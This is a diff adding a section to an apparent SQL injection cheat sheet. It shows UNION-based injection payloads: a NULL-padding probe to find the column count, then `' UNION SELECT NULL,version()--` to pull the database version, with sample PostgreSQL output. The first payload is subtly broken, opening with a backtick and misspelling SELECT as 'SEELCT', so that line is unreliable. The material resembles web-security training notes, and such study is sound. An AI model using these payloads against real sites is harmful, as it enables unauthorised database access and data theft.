@@ -2,6 +2,26 @@
 This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. 
 
 
+### First of all, in order to apply those commands with success we need to determine how many ***columns*** does the site/server uses
+```sql
+` UNION SEELCT NULL,NULL--
+```
+- And so on you add more `NULL` to test if needed. When you find the correct number of ***columns*** you will use them with the command you want to execute.
+- Example, server needed 2 columns. I removed one column and replaced it with the command i want to execute. 
+```sql
+' UNION SELECT NULL,version()--
+```
+**Result:**
+```sql
+PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+```
+#
+
+***IF WE RUN*** the following command you will see that you won't get any result or you may be blocked:
+```sql
+' UNION SELECT version()--
+```
+![image](https://github.com/th3knv/sql_cheatsheets/assets/76121926/027ea585-93ef-4247-8452-2451d3801338)
 
 
 ## String concatenation
